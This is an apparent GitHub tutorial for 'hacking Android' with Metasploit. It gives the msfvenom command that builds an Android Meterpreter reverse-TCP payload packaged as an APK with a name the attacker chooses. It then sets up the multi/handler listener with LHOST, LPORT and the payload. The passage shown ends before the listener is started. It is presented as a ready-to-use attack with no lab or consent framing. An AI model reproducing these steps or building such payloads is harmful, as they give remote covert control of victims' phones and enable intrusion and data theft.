after [Installing Metasploit](https://github.com/Muhammad-Mirab/Peneterator-Panter/blob/master/Insatlling%20Metasploit.md) now you are able to hack some devices like Android,Windows etc. and today we're going to show you how can you Hack Android

so at the first we need root permission then we have to build a payload for android!

`msfvenom -p android/meterpreter/reverse_tcp LHOST=<your ip address> LPORT=4444 R > <the name that you wanna choose for your application>.apk`

![payload for android](https://cdn1.imggmi.com/uploads/2019/10/28/0cd4ae12e138046ae9ceac05f553381e-full.png)

you can find your ip address by executing `ifconfig`:

![ifconfig](https://cdn1.imggmi.com/uploads/2019/10/28/dd2c5976eb3908daf26c3418ab1063d0-full.png)

then enter measploit by executing `msfconsole`.


![Msfconsole](https://cdn1.imggmi.com/uploads/2019/10/28/f65c76f156b3e0c9281ee8ce31fe5404-full.png)

then `use exploit/multi/handler` will change our dir to exploit(multi/handler):

![use exploit....](https://cdn1.imggmi.com/uploads/2019/10/28/7cd5f242675af9b4489ceb007e522516-full.png)

after that you have to set your LHOST and LPORT those are specified when we were trying to make an .apk payload.

LHOST is your ip address and LPORT is 4444.you can make it by `set LHOST <your IP>` and `set LPORT 4444`

![SET](https://cdn1.imggmi.com/uploads/2019/10/28/ad786a92f00b1d511a3da1a99fd0a63c-full.png)

then we have to set our payload by `set payload android/meterpreter/reverse_tcp`

![set payload](https://cdn1.imggmi.com/uploads/2019/10/28/05a5525e2835ad7416f1d6265655b70c-full.png)
